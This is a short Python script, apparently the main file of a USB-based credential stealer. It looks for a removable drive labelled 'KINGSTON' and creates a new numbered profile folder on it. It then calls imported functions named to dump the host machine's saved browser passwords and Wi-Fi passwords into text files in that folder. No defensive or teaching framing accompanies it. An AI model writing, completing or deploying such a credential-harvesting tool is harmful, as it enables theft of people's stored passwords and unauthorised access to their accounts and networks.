from browser_passwords import extract
from network_passwords import wifi_password
import win32api
import win32file
import os


def usb_drive(label: str):
    try:
        drives = win32api.GetLogicalDriveStrings().split('\u0000')[:-1]
        for drive in drives:
            try:
                if win32file.GetDriveType(drive) == win32file.DRIVE_REMOVABLE:
                    volume_info = win32api.GetVolumeInformation(drive)
                    volume_label = volume_info[0]
                    if volume_label.lower() == label.lower():
                        return drive  # e.g., "G:"
            except Exception:
                continue
    except Exception as e:
        print(f"[-] USB detection error: {e}")
    return None

if __name__ == "__main__":

    drive = usb_drive("KINGSTON")
    info_dir = os.path.join(drive, "Info")
    profiles = len(os.listdir(info_dir))

    file_path_bp = os.path.join(drive, "info", f"Profile {profiles + 1}", "browser_passwords.txt")
    if not os.path.exists(file_path_bp):
        os.makedirs(os.path.dirname(file_path_bp))

    ext = extract(file_path_bp)
    file_path_wp = os.path.join(os.path.join(drive, "info", f"Profile {profiles + 1}", "wifi_passwords.txt"))
    wp = wifi_password(file_path_wp)


    